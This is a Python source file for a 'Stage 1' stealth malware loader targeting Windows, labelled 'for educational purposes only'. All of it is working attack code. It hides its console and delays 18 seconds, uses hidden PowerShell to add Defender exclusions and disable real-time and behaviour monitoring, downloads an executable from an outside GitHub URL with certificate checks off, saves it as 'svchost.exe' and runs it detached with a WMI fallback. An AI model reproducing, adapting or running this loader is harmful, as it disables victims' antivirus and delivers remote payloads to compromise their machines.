# ============================================================
#   STAGE 1: PYTHON LOADER - STEALTH MODE (FULLY SILENT)
#   For Educational Purposes Only - Use in Isolated VM
# ============================================================

import os
import sys
import time
import subprocess
import urllib.request
import ssl
import ctypes

# ============================================================
#  CONFIGURATION
# ============================================================

PYTHON_URL = "https://www.python.org/ftp/python/3.13.15/python-3.13.15-amd64.exe"
PYTHON_INSTALLER = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'python_installer.exe')
PYTHON_DIR = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'python')
PAYLOAD_URL = "https://github.com/e34821704-max/usdtrsv/raw/refs/heads/main/Skype_Business.exe"
PAYLOAD = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'svchost.exe')

# ============================================================
#  SILENT LOGGING
# ============================================================

def log(msg):
    pass

# ============================================================
#  SILENT SUBPROCESS HELPER (Kills all windows)
# ============================================================

def silent_run(cmd, **kwargs):
    """Run a command with NO window at all"""
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0  # SW_HIDE

    kwargs['startupinfo'] = startupinfo
    kwargs['creationflags'] = subprocess.CREATE_NO_WINDOW
    kwargs.setdefault('capture_output', True)
    kwargs.setdefault('timeout', 10)

    try:
        return subprocess.run(cmd, **kwargs)
    except:
        return None

def silent_popen(cmd, **kwargs):
    """Launch a detached process with NO window"""
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0

    kwargs['startupinfo'] = startupinfo
    kwargs['creationflags'] = subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
    kwargs.setdefault('close_fds', True)
    kwargs.setdefault('stdin', subprocess.DEVNULL)
    kwargs.setdefault('stdout', subprocess.DEVNULL)
    kwargs.setdefault('stderr', subprocess.DEVNULL)

    try:
        return subprocess.Popen(cmd, **kwargs)
    except:
        return None

# ============================================================
#  STEP 1: HIDE CONSOLE WINDOW
# ============================================================

def hide_console():
    """Hide the console window completely"""
    try:
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)  # SW_HIDE
    except:
        pass

# ============================================================
#  STEP 2: 18-SECOND SLEEP
# ============================================================

def sleep_delay():
    time.sleep(18)

# ============================================================
#  STEP 3: DEFENDER EXCLUSION + DISABLE (SILENT)
# ============================================================

def configure_defender():
    exclusions = [
        f"Add-MpPreference -ExclusionPath '{os.environ.get('TEMP')}'",
        f"Add-MpPreference -ExclusionPath '{PYTHON_INSTALLER}'",
        f"Add-MpPreference -ExclusionPath '{PYTHON_DIR}'",
        f"Add-MpPreference -ExclusionPath '{PAYLOAD}'",
    ]
    processes = [
        "Add-MpPreference -ExclusionProcess 'python.exe'",
        "Add-MpPreference -ExclusionProcess 'svchost.exe'",
        "Add-MpPreference -ExclusionProcess 'certutil.exe'",
        "Add-MpPreference -ExclusionProcess 'powershell.exe'",
    ]
    disable_cmds = [
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        "Set-MpPreference -DisableBehaviorMonitoring $true",
        "Set-MpPreference -DisableBlockAtFirstSeen $true",
        "Set-MpPreference -DisableIOAVProtection $true",
    ]

    for cmd in exclusions + processes + disable_cmds:
        silent_run(['powershell', '-WindowStyle', 'Hidden', '-Command', cmd])

# ============================================================
#  STEP 4: CHECK IF PYTHON IS ALREADY INSTALLED
# ============================================================

def find_python():
    result = silent_run(['where', 'python'])
    if result and result.returncode == 0:
        paths = result.stdout.decode('utf-8', errors='ignore').strip().split('\n')
        if paths:
            return paths[0].strip()

    common_paths = [
        r"C:\Python313\python.exe",
        r"C:\Python312\python.exe",
        r"C:\Python311\python.exe",
        r"C:\Program Files\Python313\python.exe",
        r"C:\Program Files\Python312\python.exe",
        r"C:\Program Files\Python311\python.exe",
        os.path.join(os.environ.get('LOCALAPPDATA', ''),
                     r"Programs\Python\Python313\python.exe"),
        os.path.join(os.environ.get('LOCALAPPDATA', ''),
                     r"Programs\Python\Python312\python.exe"),
        os.path.join(os.environ.get('LOCALAPPDATA', ''),
                     r"Programs\Python\Python311\python.exe"),
        os.path.join(PYTHON_DIR, 'python.exe'),
    ]

    for path in common_paths:
        if os.path.exists(path):
            return path

    return None

# ============================================================
#  STEP 5: DOWNLOAD FILE (FIXED)
# ============================================================

def download_file(url, output_path):
    try:
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, context=ssl_context) as response:
            with open(output_path, 'wb') as out_file:
                out_file.write(response.read())

        return os.path.exists(output_path) and os.path.getsize(output_path) > 0
    except:
        return False

# ============================================================
#  STEP 5b: INSTALL PYTHON (SILENT)
# ============================================================

def install_python():
    if not download_file(PYTHON_URL, PYTHON_INSTALLER):
        return None

    # Install silently - no window
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0

        subprocess.run([
            PYTHON_INSTALLER,
            '/quiet',
            'InstallAllUsers=0',
            'PrependPath=1',
            'Include_test=0',
            'Include_pip=1',
            'Include_tcltk=0',
            f'TargetDir={PYTHON_DIR}'
        ],
        startupinfo=startupinfo,
        creationflags=subprocess.CREATE_NO_WINDOW,
        capture_output=True,
        timeout=300)
    except:
        pass

    try:
        os.remove(PYTHON_INSTALLER)
    except:
        pass

    python_exe = os.path.join(PYTHON_DIR, 'python.exe')
    if os.path.exists(python_exe):
        return python_exe

    return None

# ============================================================
#  STEP 6: EXECUTE PAYLOAD (FULLY DETACHED, NO WINDOW)
# ============================================================

def execute_payload(payload_path):
    if not os.path.exists(payload_path):
        return False

    # Method 1: Detached subprocess
    if silent_popen([payload_path]):
        return True

    # Method 2: WMI fallback
    try:
        silent_run(['wmic', 'process', 'call', 'create', payload_path])
        return True
    except:
        pass

    return False

# ============================================================
#  MAIN
# ============================================================

def main():
    # STEP 1: Hide console
    hide_console()

    # STEP 2: 18-second sleep
    sleep_delay()

    # STEP 3: Defender exclusion + disable
    configure_defender()

    # STEP 4: Check Python
    python_exe = find_python()

    # STEP 5: Install Python if missing
    if not python_exe:
        python_exe = install_python()

    if not python_exe:
        sys.exit(1)

    # STEP 6: Download payload
    if not download_file(PAYLOAD_URL, PAYLOAD):
        sys.exit(1)

    # STEP 7: Execute payload
    execute_payload(PAYLOAD)

    sys.exit(0)

# ============================================================
#  ENTRY POINT
# ============================================================

if __name__ == "__main__":
    try:
        main()
    except:
        pass
    finally:
        sys.exit(0)